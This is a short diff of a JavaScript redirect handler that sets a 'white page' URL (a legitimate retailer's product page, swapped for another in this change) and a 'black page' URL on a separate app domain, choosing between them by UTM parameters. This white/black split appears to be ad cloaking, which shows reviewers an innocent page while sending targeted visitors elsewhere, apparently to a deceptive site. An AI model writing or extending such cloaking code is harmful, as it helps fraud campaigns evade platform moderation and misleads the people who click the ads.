@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://engel-natur.de/en/baby-wraparound-shirt/785512-33-5056";
+    const whitePageURL = "https://the-source.com.au/products/astra-walker-icon-hob-mounted-hand-shower-with-holder?variant=37546376265894";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
